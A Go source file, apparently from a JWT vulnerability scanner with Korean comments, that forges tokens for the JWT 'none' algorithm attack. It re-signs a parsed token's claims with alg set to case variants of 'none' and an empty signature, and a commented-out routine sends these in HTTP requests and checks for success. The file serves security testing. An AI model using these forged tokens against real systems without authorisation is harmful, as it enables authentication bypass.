package attack

/*
- jwt none 알고리즘 공격 페이로드를 생성 및 취약점 스캔을 진행합니다.
- 공격 성공 조건 : 변조된 JWT를 전송했을때, HTTP RESPONSE에 'Welcome guest to this website' 문자 존재

※ 공격 성공 조건은 현재 임시로 설정하였으며, 추후에 범용적으로 사용할 수 있는 조건으로 변경할 계획입니다. (ex : HTTP RESP CODE 200 반환)
*/

import (
	"fmt"
	"log"
	"net/http"

	"github.com/golang-jwt/jwt/v5"
	"github.com/ksw9722/jwt-checker/pkg/common"
)

const SIGNATURE string = "{{INSERT_PAYLOAD}}"
const SUCCESS_SIGNATURE string = "Welcome guest to this website"

type nonAlgorithm struct {
	Jwt         string                    // jwt token 원형을 입력 받습니다.
	PayloadList []string                  // 공격에 사용할 페이로드가 보관됩니다. (변형된 JWT)
	SuccessMap  map[string]*http.Response // 공격 성공 시, map[payload]Response 형식으로 기록합니다.
}

/*
// 페이로드를 포함한 패킷을 전송하여, 취약점이 존재하는지 검증합니다.
// HttpMessageToGoResp 에서 계속 에러 발생해서 잠시 보류 ㅠ
func (jwtObject *nonAlgorithm) Attack(message string) {
	jwtObject.GeneratePayload()
	for i := 0; i < len(jwtObject.PayloadList); i++ {
		mutateMessage := strings.Replace(message, SIGNATURE, jwtObject.PayloadList[i], -1) // 변형된 JWT를 통해 요청 생성
		resp := common.HttpMessageToGoResp(mutateMessage)                                  // 요청 전달 및 응답 반환
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
			return
		}

		if strings.Contains(string(body), SUCCESS_SIGNATURE) {
			jwtObject.SuccessMap[jwtObject.PayloadList[i]] = resp
		}
	}

}
*/

// 임시로 변형된 JWT 패킷을 출력해주는 예제로 수정
func (jwtObject *nonAlgorithm) Attack(message string) {
	jwtObject.generatePayload()
	for i := 0; i < len(jwtObject.PayloadList); i++ {
		fmt.Println(jwtObject.PayloadList[i])
	}
}

// 공격에 사용할 페이로드를 생성합니다.
func (jwtObject *nonAlgorithm) generatePayload() {
	token, _, err := new(jwt.Parser).ParseUnverified(jwtObject.Jwt, jwt.MapClaims{})
	if err != nil {
		log.Fatal(err)
	}
	jwtClaims := token.Claims.(jwt.MapClaims)
	encodedJwtClaims := common.Base64Encode(common.MapToString(jwtClaims))
	noneAlgList := []string{"none", "None", "NONE", "noNe"}

	for alg := range noneAlgList {
		jwtHeader := map[string]interface{}{"typ": "jwt", "alg": noneAlgList[alg]}
		encodedJwtHeader := common.Base64Encode(common.MapToString(jwtHeader))
		jwtPayload := fmt.Sprintf("%s.%s.", encodedJwtHeader, encodedJwtClaims)
		jwtObject.PayloadList = append(jwtObject.PayloadList, jwtPayload)
	}

}

// None Algorithm 공격을 위한 생성자입니다.
func NonAlgorithm(tokenString string) *nonAlgorithm {
	return &nonAlgorithm{tokenString, make([]string, 0), make(map[string]*http.Response)}
}
